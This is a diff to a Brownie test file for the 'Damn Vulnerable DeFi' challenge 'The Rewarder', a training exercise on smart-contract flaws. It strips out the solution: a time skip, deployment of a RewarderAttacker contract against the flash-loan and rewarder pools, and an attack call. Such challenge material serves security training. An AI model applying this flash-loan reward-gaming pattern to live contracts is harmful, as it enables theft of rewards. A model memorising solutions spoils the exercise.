@@ -5,7 +5,6 @@ from brownie import (
     DamnValuableToken,
     RewardToken,
     AccountingToken,
-    RewarderAttacker,
 )
 from brownie.network.contract import Contract
 from brownie.network.state import Chain
@@ -52,13 +51,6 @@ def test_the_rewarder():
     assert rewarder_pool.roundNumber() == 2
 
     # YOUR EXPLOIT GOES HERE
-    Chain().sleep(5 * 24 * 60 * 60)
-    ac = RewarderAttacker.deploy(
-        flashloan_pool.address,
-        rewarder_pool.address,
-        {"from": attacker},
-    )
-    ac.attack(TOKENS_IN_LENDER_POOL)
 
     # Only one round should have taken place
     assert rewarder_pool.roundNumber() == 3
